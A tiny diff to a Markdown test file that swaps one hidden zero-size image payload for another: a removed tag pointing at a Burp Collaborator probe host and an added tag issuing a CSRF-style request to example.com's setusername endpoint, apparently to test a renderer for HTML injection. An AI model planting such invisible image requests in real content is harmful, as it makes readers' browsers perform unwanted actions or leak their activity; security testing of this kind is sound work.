@@ -1,3 +1,3 @@
 # test
 test
-![some test](<img src="http://468q6xi5r4j3cumlzjo0dh0ykpqhe6.burpcollaborator.net" width="0" height="0" border="0">)
+![some test](<img src="http://www.example.com/api/setusername?username=CSRFd">" width="0" height="0" border="0">)
